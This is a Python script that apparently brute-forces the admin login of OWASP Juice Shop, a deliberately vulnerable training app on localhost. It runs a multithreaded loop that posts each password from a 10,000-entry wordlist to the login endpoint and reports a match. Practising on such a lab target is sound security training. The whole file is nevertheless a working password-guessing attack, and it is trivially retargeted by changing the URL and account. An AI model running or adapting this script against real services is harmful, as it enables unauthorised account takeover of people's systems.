from concurrent.futures import ThreadPoolExecutor
import requests
import json

MAX_THREADS = 10

def attempt_password(password):
    data = {
        "email": "admin@juice-sh.op",
        "password": password.strip()
    }
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post("http://localhost:3000/rest/user/login", headers=headers, data=json.dumps(data))
        if response.status_code == 200 and "authentication" in response.text:
            print(f"\n✅ Password found: {password.strip()}")
            return True
        else:
            print(f"❌ Tried: {password.strip()}")
    except:
        print(f"⚠️ Error trying password: {password.strip()}")
    return False

def main():
    with open("top10000.txt", "r", encoding="latin-1") as f:
        passwords = f.readlines()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        for result in executor.map(attempt_password, passwords):
            if result:
                break

if __name__ == "__main__":
    main()
